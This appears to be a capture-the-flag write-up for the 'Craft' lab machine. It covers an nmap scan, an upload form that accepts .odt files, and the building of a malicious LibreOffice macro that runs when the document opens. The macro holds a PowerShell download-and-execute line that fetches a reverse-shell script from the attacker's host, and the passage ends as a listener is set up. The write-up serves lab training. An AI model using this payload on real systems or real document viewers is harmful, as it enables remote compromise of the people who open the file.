### Craft Proving Grounds Practice

### Difficulty = Intermediate

### IP Address = 192.168.175.169

Nmap Scan

```
└─$ nmap -sCV -A 192.168.175.169 -p80 -oN nmapscan                     
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-23 23:35 WAT
Nmap scan report for 192.168.175.169
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-title: Craft
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.55 seconds
```

From the scan we can tell that only one tcp port is open

I'll head over to see what it is
![image](https://user-images.githubusercontent.com/113513376/221046662-3d73f892-cb01-4e17-8966-59ce005fb08c.png)

It doesn't contain anything much looking below shows a file upload form
![image](https://user-images.githubusercontent.com/113513376/221056128-935d2864-241a-448a-9b18-1a4122b93bff.png)

Uploading any file shows that it only accepts a .odt file 
![image](https://user-images.githubusercontent.com/113513376/221056229-d2f6ed55-35af-41c1-8eb0-7cbf5839908a.png)

After trying to upload a fake .odt file shows that it will be viewed soon
![image](https://user-images.githubusercontent.com/113513376/221056321-609ab0eb-cb2d-4baf-a87c-34899df2962e.png)

So with this we know that we can upload a .odt file which is just like an excel spreadsheet

But lets say if we manage to even upload a .php file we won't be able to execute it cause its been viewed by a person (bot)

Now we can perform a macros attack

Which basically puts in a malicious content in the file then after it is being viewed the macros content will be executed

### Payload Creation 

Here's what i'll do 
![image](https://0xdf.gitlab.io/img/image-20191126164802663.png)

```
I’ll open Calc, and go to Tools –> Macros –> Organize Macros –> LibreOffice Basic:
```

In the dialog box that pops up, I’ll select the document I’m working in on the left side (Untitled 1) and click “New”. I’ll give the module a name (“evil”), and click Ok to be taken to the macro editor:
![image](https://user-images.githubusercontent.com/113513376/221057141-7fc7502d-b1de-44bf-8b28-656672c72fda.png)

OpenOffice macros use Basic, a similar but [slightly different](https://wiki.openoffice.org/wiki/Documentation/FAQ/Macros/Can_I_use_my_Microsoft_Office_macros%3F) language to the VBA that’s in MS macros. To run a command on a Windows host from LibreOffice Basic, I’ll need to put it into Shell() as a string. So I wrap my command in "". To nest quotes, I’ll use two double quotes (""). I’ll call Shell to execute some simple download and execute code:

```
REM  *****  BASIC  *****

Sub Main

    Shell("cmd /c powershell ""IEX(New-Object Net.Webclient).downloadString('http://192.168.45.5/Invoke-PowerShellTcp.ps1')""")
    
End Sub
```

#### AutoOpen

Now I need to make sure this macro is run when the document is opened. I'll close the macro editors, and back in the document, go to Tools –> Customize -> Events tab:
![image](https://user-images.githubusercontent.com/113513376/221057696-e6d15dd4-c16c-4427-9b8c-79b4bc4a60fb.png)

I'll select "Open Document" and click on the "Macro…" button. I'll navigte to select my macro:
![image](https://user-images.githubusercontent.com/113513376/221059441-f630cdc9-d34e-47af-8b55-4d03bc709e02.png)

When I hit "OK", I see it now in the list:
![image](https://user-images.githubusercontent.com/113513376/221059503-f810f247-f894-461d-9aa4-bde2e5a4805b.png)

I'll save my sheet as shell.ods, and exit LibreOffice.

Reference to this [0xdf](https://0xdf.gitlab.io/2020/02/01/htb-re.html)

Cool with this payload i'll set up a listener and a http server on port 80 hosting a powershell reverse shell





